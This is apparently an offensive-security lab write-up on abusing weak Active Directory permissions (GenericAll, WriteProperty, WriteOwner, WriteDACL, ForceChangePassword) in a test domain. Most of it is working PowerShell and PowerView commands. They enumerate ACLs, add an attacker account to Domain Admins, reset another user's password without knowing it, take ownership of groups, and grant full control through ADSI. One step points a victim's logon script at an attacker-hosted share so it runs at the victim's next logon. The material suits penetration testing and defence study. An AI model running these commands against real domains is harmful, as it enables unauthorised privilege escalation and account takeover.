# Abusing Active Directory ACLs/ACEs

Context

This lab is to abuse weak permissions of Active Directory Discretionary Access Control Lists (DACLs) and Acccess Control Entries (ACEs) that make up DACLs.

Active Directory objects such as users and groups are securable objects and DACL/ACEs define who can read/modify those objects (i.e change account name, reset password, etc).

An example of ACEs for the "Domain Admins" securable object can be seen here:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LQoyPbfXZf7NsXQLDfn%2F-LQozBYCqiYmXeC0X8td%2FScreenshot%20from%202018-11-08%2020-21-25.png?alt=media\&token=4ae6a6d5-c614-422a-80c3-eda1e7e56225)

Some of the Active Directory object permissions and types that we as attackers are interested in:

* **GenericAll** - full rights to the object (add users to a group or reset user's password)
* **GenericWrite** - update object's attributes (i.e logon script)
* **WriteOwner** - change object owner to attacker controlled user take over the object
* **WriteDACL** - modify object's ACEs and give attacker full control right over the object
* **AllExtendedRights** - ability to add user to a group or reset password
* **ForceChangePassword** - ability to change user's password
* **Self (Self-Membership)** - ability to add yourself to a group

In this lab, we are going to explore and try to exploit most of the above ACEs.

### Execution

#### GenericAll on User

Using powerview, let's check if our attacking user `spotless` has `GenericAll rights` on the AD object for the user `delegate`:

```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}  
```

We can see that indeed our user `spotless` has the `GenericAll` rights, effectively enabling the attacker to take over the account:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LQjpiAP-4fU_5UNuywO%2F-LQjpClfAYbjfz5sTFhk%2FScreenshot%20from%202018-11-07%2020-19-43.png?alt=media\&token=b2800791-71b0-4898-9e0f-ae24fa6bcf14)

We can reset user's `delegate` password without knowing the current password:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LQp-H1xlaH8aA4-2Hop%2F-LQp0OBEFjQyrzBFIbRN%2FScreenshot%20from%202018-11-07%2020-21-30.png?alt=media\&token=e1301337-95b6-4b0c-8528-86cc47784b31)

#### GenericAll on Group

Let's see if `Domain admins` group has any weak permissions. First of, let's get its `distinguishedName`:

```csharp
Get-NetGroup "domain admins" -FullData
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LQmiPt4uZmkID4t36ha%2F-LQmijiklf02gLJWMtCp%2FScreenshot%20from%202018-11-08%2009-50-20.png?alt=media\&token=2152c357-43ce-4eaa-a819-301389c2d51f)

```csharp
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}
```

We can see that our attacking user `spotless` has `GenericAll` rights once again:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LQmiPt4uZmkID4t36ha%2F-LQmjBGYGbZA_OOIeNHO%2FScreenshot%20from%202018-11-08%2009-52-10.png?alt=media\&token=29c0df88-43ec-46c3-83be-d0e453ce9307)

Effectively, this allows us to add ourselves (the user `spotless`) to the `Domain Admin` group:

```csharp
net group "domain admins" spotless /add /domain
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LQmiPt4uZmkID4t36ha%2F-LQmn2GTsTnPY3SQCslO%2FPeek%202018-11-08%2010-07.gif?alt=media\&token=d24110bc-b5de-4bd9-a7be-5401f5588c16)

Same could be achieved with Active Directory or PowerSploit module:

```csharp
# with active directory module
Add-ADGroupMember -Identity "domain admins" -Members spotless

# with Powersploit
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

#### GenericAll / GenericWrite / Write on Computer

If you have these privileges on a Computer object, you can pull [Kerberos Resource-based Constrained Delegation: Computer Object Take Over](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution) off.

#### WriteProperty on Group

If our controlled user has `WriteProperty` right on `All` objects for `Domain Admin` group:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LQmxW76ILHmnfUZadTW%2F-LQn0GQY_pynhU0Gap3y%2FScreenshot%20from%202018-11-08%2011-11-11.png?alt=media\&token=3e31b7c9-68c5-4c29-ae17-38dbcca5b207)

We can again add ourselves to the `Domain Admins` group and escalate privileges:

```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LQmxW76ILHmnfUZadTW%2F-LQn-AtQXNvoLNDvyb0T%2FScreenshot%20from%202018-11-08%2011-06-32.png?alt=media\&token=42b5bc6d-7f40-4a73-b7ea-3b1e27afed68)

#### Self (Self-Membership) on Group

Another privilege that enables the attacker adding themselves to a group:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LQn10Ds3mgRr8Pv1bKS%2F-LQn3ApZIp7wGvogb4yW%2FScreenshot%20from%202018-11-08%2011-23-52.png?alt=media\&token=5e641134-a59b-4c75-a30a-2cbfe7aa4ce2)

```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LQn10Ds3mgRr8Pv1bKS%2F-LQn3WPwtfgu7VBo-Jgo%2FScreenshot%20from%202018-11-08%2011-25-23.png?alt=media\&token=e3a39a62-c000-4543-9240-d3d91eae1700)

#### WriteProperty (Self-Membership)

One more privilege that enables the attacker adding themselves to a group:

```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LQnuM4wKjoznxmsAIQA%2F-LQnuYxxnMVF0KUlnZhS%2FScreenshot%20from%202018-11-08%2015-21-35.png?alt=media\&token=769bdf87-e5c8-41cc-9110-7f186249e1f8)

```csharp
net group "domain admins" spotless /add /domain
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LQnuM4wKjoznxmsAIQA%2F-LQnurOfE0u5MmN70FQl%2FScreenshot%20from%202018-11-08%2015-22-50.png?alt=media\&token=3df1b29c-98a7-46b6-8c37-587f79b2a5f1)

#### **ForceChangePassword**

If we have `ExtendedRight` on `User-Force-Change-Password` object type, we can reset the user's password without knowing their current password:

```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LQn10Ds3mgRr8Pv1bKS%2F-LQnIJkd1cZiPs5pAKxh%2FScreenshot%20from%202018-11-08%2012-30-11.png?alt=media\&token=05e49782-3b43-415d-9393-376fe5233448)

Doing the same with powerview:

```csharp
Set-DomainUserPassword -Identity delegate -Verbose
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LQn10Ds3mgRr8Pv1bKS%2F-LQnIhBndQp0TR-oq77M%2FScreenshot%20from%202018-11-08%2012-31-52.png?alt=media\&token=b4b12000-89e2-4a38-97df-aebc6db5cd4c)

Another method that does not require fiddling with password-secure-string conversion:

```csharp
$c = Get-Credential
Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LQne3ATFqC0MratUZJp%2F-LQneUrg0fzhoLA_Nf6_%2FScreenshot%20from%202018-11-08%2014-11-25.png?alt=media\&token=01f66595-381d-41c8-8815-22838c3e1d82)

...or a one liner if no interactive session is not available:

```csharp
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LQnOOg2UuisoYtQlsNz%2F-LQnOmTWDzUfJFsAcKA4%2FScreenshot%20from%202018-11-08%2012-58-25.png?alt=media\&token=c4396273-a499-4a04-bf31-710d2c44954a)

#### WriteOwner on Group

Note how before the attack the owner of `Domain Admins` is `Domain Admins`:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LQoECV1FDB-H_F_sZZl%2F-LQoEZ10KIG81i-2awq5%2FScreenshot%20from%202018-11-08%2016-45-36.png?alt=media\&token=a88b2b0d-6fdc-4522-a92c-08a161da6a2e)

After the ACE enumeration, if we find that a user in our control has `WriteOwner` rights on `ObjectType:All`

```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LQoECV1FDB-H_F_sZZl%2F-LQoEdTkZ0renZwjI4Y7%2FScreenshot%20from%202018-11-08%2016-45-42.png?alt=media\&token=976862eb-ca41-4b9d-8c5d-428b1170b89b)

...we can change the `Domain Admins` object's owner to our user, which in our case is `spotless`. Note that the SID specified with `-Identity` is the SID of the `Domain Admins` group:

```csharp
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LQoECV1FDB-H_F_sZZl%2F-LQoEw6ju4djFcgir36x%2FScreenshot%20from%202018-11-08%2016-54-59.png?alt=media\&token=30f0e2f9-fbdb-4194-8c19-3b00f1ee6648)

#### GenericWrite on User

```csharp
Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LQohCREBZ7Ian7G7pfx%2F-LQojJ2fBHF5Sd_kfc3V%2FScreenshot%20from%202018-11-08%2019-12-04.png?alt=media\&token=a03e9724-1d4c-4616-b02f-b318e8ba374c)

`WriteProperty` on an `ObjectType`, which in this particular case is `Script-Path`, allows the attacker to overwrite the logon script path of the `delegate` user, which means that the next time, when the user `delegate` logs on, their system will execute our malicious script:

```csharp
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

Below shows the user's ~~`delegate`~~ logon script field got updated in the AD:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LQohCREBZ7Ian7G7pfx%2F-LQojiC-BS6rJYq9PMaj%2FScreenshot%20from%202018-11-08%2019-13-45.png?alt=media\&token=00dd841d-a6bd-4565-a1f7-903e482273a4)

#### WriteDACL + WriteOwner

If you are the owner of a group, like I'm the owner of a `Test` AD group:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LQyQIId2LzDsrZi2lxp%2F-LQz0EI9Uv43_y7X1LuZ%2FScreenshot%20from%202018-11-10%2019-02-57.png?alt=media\&token=39627031-617c-4f72-b009-cbdefec53b12)

Which you can of course do through powershell:

```csharp
([ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local").PSBase.get_ObjectSecurity().GetOwner([System.Security.Principal.NTAccount]).Value
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LQz56gec8t1bT9NafYR%2F-LQz5TlyZ8PzQSkMwgjs%2FScreenshot%20from%202018-11-10%2019-29-27.png?alt=media\&token=4ad3342d-9bb4-4ab8-beb0-bee36bc9eafe)

And you have a `WriteDACL` on that AD object:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LQyQIId2LzDsrZi2lxp%2F-LQz0NbqcSfT3gWVhr6D%2FScreenshot%20from%202018-11-10%2019-07-16.png?alt=media\&token=efb42522-346d-44e1-ab77-3ad3ac74154c)

...you can give yourself `GenericAll` privileges with a sprinkle of ADSI sorcery:

```csharp
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

Which means you now fully control the AD object:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LQyQIId2LzDsrZi2lxp%2F-LQz0XLP59LZk0Cwuey1%2FScreenshot%20from%202018-11-10%2019-02-49.png?alt=media\&token=505546bf-1585-4e68-b689-22f4a0f4e315)

This effectively means that you can now add new users to the group.

Interesting to note that I could not abuse these privileges by using Active Directory module and `Set-Acl` / `Get-Acl` cmdlets:

```csharp
$path = "AD:\CN=test,CN=Users,DC=offense,DC=local"
$acl = Get-Acl -Path $path
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule (New-Object System.Security.Principal.NTAccount "spotless"),"GenericAll","Allow"
$acl.AddAccessRule($ace)
Set-Acl -Path $path -AclObject $acl
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LQyQIId2LzDsrZi2lxp%2F-LQz11n0b6eE7L6BHO-O%2FScreenshot%20from%202018-11-10%2019-09-08.png?alt=media\&token=2a95cbaa-2b3c-4e8f-a67c-a17f112c2c9c)

### References

{% embed url="https://wald0.com/?p=112" %}

{% embed url="https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2" %}

{% embed url="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/" %}

{% embed url="https://adsecurity.org/?p=3658" %}

{% embed url="https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_" %}

[PowerView Tricks](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
